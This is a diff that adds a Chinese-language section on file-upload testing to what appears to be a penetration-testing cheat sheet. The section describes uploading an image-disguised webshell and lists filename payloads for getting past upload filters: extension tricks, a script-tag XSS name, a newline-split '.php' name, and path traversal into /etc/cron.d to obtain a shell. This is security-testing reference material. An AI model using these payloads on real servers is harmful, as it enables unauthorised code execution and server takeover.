@@ -609,3 +609,19 @@ jsp一句话
     }
 %>
 
+文件上传  
+
+对于文件上传测试，首先准备一个图片马 例如 shell.jpg ，抓取上传时的数据包，  
+1.正常上传该文件，观察返回数据包内市是否存在上传路径，以及文件名是否被修改  
+若文件名可控  
+测试方法一：我们可以将 filename="shell.jpg" 修改为 filename="shell.php\.aaa*"  
+测试方法二：我们可以将 filename="shell.jpg" 修改为 filename="shell.php/"  
+测试方法三：我们可以将 filename="shell.jpg" 修改为 filename="shell.php"  
+测试方法四：我们可以将 filename="shell.jpg" 修改为 filename="<script>alert(110)</script>.jpg"  
+测试方法五：我们可以将 filename="shell.jpg" 修改为 filename=".php  
+h.   
+123"   
+
+测试方法六：我们可以将 filename="shell.jpg" 修改为 filename="../../etc/cron.d/rootl.sh"通过计划任务去拿shell  
+若文件名不可控  
+我们就使用常规的测试方法和条件竞争去测试  
